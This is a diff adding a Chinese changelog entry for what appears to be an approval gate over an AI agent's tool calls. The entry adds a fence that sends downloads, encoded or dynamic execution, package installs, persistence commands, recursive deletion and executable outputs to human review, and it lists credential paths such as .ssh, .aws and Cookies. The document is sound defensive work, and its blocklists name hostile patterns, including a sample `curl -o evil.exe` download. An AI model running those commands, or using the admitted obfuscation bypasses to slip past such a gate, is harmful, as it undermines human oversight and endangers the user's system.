@@ -4,6 +4,59 @@
 
 > 英文版见 [CHANGELOG.en.md](CHANGELOG.en.md)。
 
+## [0.9.7] — 2026-10-04
+
+**工作区内按定域放行，同时给「下载 / 可执行产物」加一道否决层。** 用户决策：工作区内的增删改查风险可控，不必每次人工；但模型被诱导下载恶意脚本、exe 时必须触发审批。
+
+这两条天然矛盾 —— `curl -o evil.exe http://x/y` 的目标**完全在工作区内**，纯定域规则会直接放行。所以围栏必须是定域放行之上的**否决层**，且排在白名单与学习之前：否则一次追认沉淀的 `contains` 宽规则就能把「下载」永久放行。
+
+### 新增：危险动作围栏（确定性，转人工且不学习、不可追认）
+
+| 类别 | 命中特征 | 豁免 |
+|---|---|---|
+| 网络下载 | `curl` / `wget` / `aria2c` / `bitsadmin` / `Invoke-WebRequest`\|`iwr` / `Invoke-RestMethod`\|`irm` / `Start-BitsTransfer` / `certutil -urlcache` / `DownloadString`\|`DownloadFile`\|`DownloadData` / `gh release download` | 命令里的 URL **全部**指向本机（`http://127.0.0.1:1933/health` 是健康检查，不是取物） |
+| 动态执行 | `Invoke-Expression` / `iex` / `-EncodedCommand` / `FromBase64String` / `certutil -decode` / `\| bash`\|`sh`\|`pwsh`\|`powershell`\|`cmd`\|`iex` | — |
+| 依赖安装 | `npm`\|`pnpm`\|`yarn`\|`bun` `i`\|`install`\|`add`\|`dlx`\|`exec` / `pip install` / `cargo`\|`go`\|`winget`\|`choco`\|`scoop install` / `docker pull` | 命令指向 `$DSH_HOME`（profile / 插件依赖那一档本就自动放行） |
+| 持久化 | `schtasks` / `reg add` / `New-Service` / `sc create` / `core.hooksPath` / `Set-ExecutionPolicy` / `netsh advfirewall` / `Add-MpPreference` / `bcdedit` / `wmic` / `takeown` / `icacls` | — |
+| 递归删除 | `Remove-Item … -Recurse` / `rm -r…` / `rmdir /s` / `rmtree` / `git clean` / `git reset --hard` | **单文件清理不拦**：推送后删掉 `_commit-msg.txt` 是日常动作，30 天 36 次，全拦会把人工提示从 147 抬到 180 |
+| 可执行产物 | 写目标扩展名 `.exe .dll .msi .bat .cmd .ps1 .vbs .hta .lnk .reg .jar …`，或落在 `.git/hooks/`、`.github/workflows/`、`Startup/`、`sitecustomize.py` | `.sh`/`.py`/`.js` 不在列（开发工作区天天产出）；「下载 .sh 再执行」由前两行覆盖 |
+
+**判定口径刻意收窄，避免误报**（每一条都对应实测到的假命中）：
+
+- **命令类工具只看命令里的「落盘目标」**（重定向 / `-OutFile` / `-o` / `--output` / `-DestinationPath` / `Out-File` / `Set-Content` / `open(...,'w')`），不看它被 `resolveToolCallFiles` 判定的「写目标」—— 后者的写特征很宽（`*>` 重定向就算写），会把 `pwsh -File .\build.ps1 *> .\tmp\x.log` 里**被执行**的 `.ps1` 误判成「本次产出的可执行文件」
+- **持久化按动词判定，不按路径出现**：`.github/workflows` 出现在读取命令或 `git add` 的参数里不是持久化（实测 6 次假命中）
+- `Start-Process` 不在围栏里（启动本地服务是常规动作，实测 2 次假命中）
+
+### 新增：定域放行（可开关）
+
+- 位置：白名单之后、判定器之前。`targetScope === 'inside'` 且未命中围栏 ⇒ 直接放行，事件记 `verdict: 'scope'`，**判定器零调用**
+- 定域输入补上**解析后的相对写目标**：`write`/`edit` 常给 `src/x.mjs`，不解析就永远是 `unknown`（= 不放行），这条最常见的写操作本来会完全失效
+- **fail-closed 不变**：`unknown`（提不出绝对路径 / 含 `..` 穿越）、`outside`、`mixed` 一律不放行
+- 设置页新增开关「定域放行：目标全部在工作区内 → 直接放行」，关闭后回到旧行为（区内提权也走判定器/人工）
+- 拦截原因进事件（`facts.fenceText`）与中文卡正文（新增 `拦截：…` 行），字段表格新增「拦截原因」行（警示色）—— 没有它，卡片上只有模型自己的说法
+
+### 实测（真实 `events.jsonl`，30 天 1204 事件 / 147 次人工提示）
+
+- 围栏命中 **23 次**，其中 13 次原本是自动放行 ⇒ 新增人工 ≈ **0.4 次/天**
+- 定域放行省下 **23 次**人工提示（另外 4 次 inside 提示被围栏挡住）
+- 净效果：**30 天少 10 次人工提示**（−7%），同时第一次拥有了「下载 / 可执行产物」这道闸
+- 分布：人工提示里 `unknown` 83 / `outside` 35 / `inside` 27 / `mixed` 2 —— 区内只占 18%，所以定域放行的上限本来就不高（与 0.9.6 的判断一致）
+- 围栏贡献最大的一项是**递归删除（15 次）**，其中 4 次是 heredoc 脚本正文里含 `rm -rf` 的假命中。想拿满 −23 的收益就把这一档去掉，代价是区内递归删除变成永久自动
+
+### 行为变化（需要知道）
+
+- **判定器看到的流量变窄**：工作区内的调用不再进入判定层。原先「区内调用 → 判定器 → allow」的路径改由确定性规则接管
+- 三个既有测试文件（`pipeline` / `session-scope` / `path-targets`）显式设 `scopeAutoAllow: false`：它们测的是判定管道与规则作用域，不是定域放行；定域放行与围栏由新增的 `test/fence-scope.test.mjs` 单独覆盖
+- `pipeline.test.mjs` 的脱敏用例把 `curl -H "Authorization: Bearer …"` 换成普通命令 —— 前者现在会命中网络下载围栏，判定器根本不会被调用
+
+### 诚实交代：围栏挡不住什么
+
+围栏是**文本特征**匹配，能被刻意混淆绕过（base64、变量拼接、二次下载、先写脚本再执行）。它挡的是「模型被诱导」这类非对抗性失败，不是定向攻击。真正的边界仍然是沙箱与人工。
+
+### 下一步（尚未实施）
+
+④ git 按命令锚定（匹配上下文去掉 justification 措辞）+ 工作区外一律人工 + 敏感路径形态（`.ssh` / `.aws` / `id_rsa` / `*.pem` / `.env` / `credential` / `token` / `Login Data` / `Cookies`）永远人工；同时删掉 5 条宽泛的种子规则（30 天 22 次使用）。
+
 ## [0.9.6] — 2026-10-04
 
 **审批记录终于能回答「这次动的是工作区内还是工作区外」**：新增确定性绝对路径提取与目标定域，命令类工具（`pwsh` / `bash`）的绝对路径不再丢失，说明措辞里的相对片段不再冒充目标。
